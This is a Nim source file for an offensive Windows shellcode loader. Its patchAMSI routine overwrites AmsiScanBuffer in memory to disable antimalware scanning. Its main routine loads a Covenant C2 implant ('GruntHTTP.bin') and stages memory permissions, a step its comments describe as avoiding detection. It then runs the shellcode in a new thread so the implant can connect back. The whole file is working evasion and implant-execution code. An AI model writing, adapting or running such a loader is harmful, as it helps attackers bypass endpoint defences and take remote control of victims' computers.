import winim
import winim/com
import std/os

proc patchAMSI() =
    # 1. Load the library (Note the Capital 'L')
    let hAmsi = LoadLibraryA("amsi.dll")
    if hAmsi == 0: return

    let pAddr = GetProcAddress(hAmsi, "AmsiScanBuffer")
    if pAddr == nil: return

    var patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    var oldProtect: DWORD
    
    # 3. Apply the patch
    VirtualProtect(pAddr, patch.len, PAGE_EXECUTE_READWRITE, addr oldProtect)
    copyMem(pAddr, addr patch[0], patch.len)
    VirtualProtect(pAddr, patch.len, oldProtect, addr oldProtect)
    
    echo "[+] AMSI Patched Successfully"

proc main() =
  # 1. Path to your Covenant bin
  let fileName = "GruntHTTP.bin"
  
  if not fileExists(fileName):
      echo "[!] Error: ", fileName, " not found."
      return

  # 2. Read the file into a Nim sequence of bytes
  # readFile returns a string, so we convert it to a sequence of bytes
  let rawData = readFile(fileName)
  var shellcode = newSeq[byte](rawData.len)
  copyMem(addr shellcode[0], unsafeAddr rawData[0], rawData.len)
  
  echo "[+] Loaded ", shellcode.len, " bytes of shellcode."

  # 3. Allocate Memory (Read/Write)
  # We don't use PAGE_EXECUTE_READWRITE immediately to avoid detection
  let pAddress = VirtualAlloc(
      nil, 
      shellcode.len, 
      MEM_COMMIT or MEM_RESERVE, 
      PAGE_READWRITE
  )

  if pAddress == nil:
      echo "[!] VirtualAlloc failed."
      return

  # 4. Copy shellcode into the allocated buffer
  copyMem(pAddress, addr shellcode[0], shellcode.len)

  # 5. Flip memory permissions to Execute (RX)
  var oldProtect: DWORD
  let vpSuccess = VirtualProtect(
      pAddress, 
      shellcode.len, 
      PAGE_EXECUTE_READ, 
      addr oldProtect
  )

  if vpSuccess == 0:
      echo "[!] VirtualProtect failed."
      return

  # 6. Execute via CreateThread
  echo "[+] Executing shellcode..."
  let hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](pAddress), nil, 0, nil)
  
  # Wait for the shellcode to finish (or the Grunt to establish connection)
  WaitForSingleObject(hThread, INFINITE)

patchAMSI()
main()